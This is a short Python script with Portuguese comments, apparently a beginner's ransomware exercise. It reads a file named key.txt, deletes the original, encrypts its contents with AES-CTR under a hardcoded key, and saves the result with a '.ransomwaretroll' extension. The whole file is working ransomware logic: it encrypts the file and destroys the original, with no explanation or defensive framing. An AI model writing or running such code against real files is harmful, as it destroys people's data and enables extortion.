import os
import pyaes

# abrir o arquivo a ser criptografado
file_name = "key"
file_extension = ".txt"
file_fullname = f"{file_name}{file_extension}"
file = open(file_fullname, "rb")
file_data = file.read()
file.close()

# remover o arquivo
os.remove(file_fullname)

# chave de criptografia
key = b"dec168pandorasxm"
aes = pyaes.AESModeOfOperationCTR(key)

# criptografar o arquivo
crypto_data = aes.encrypt(file_data)

# salvar o arquivo criptografado
new_file = file_name + ".ransomwaretroll"
new_file = open(f'{new_file}','wb')
new_file.write(crypto_data)
new_file.close()
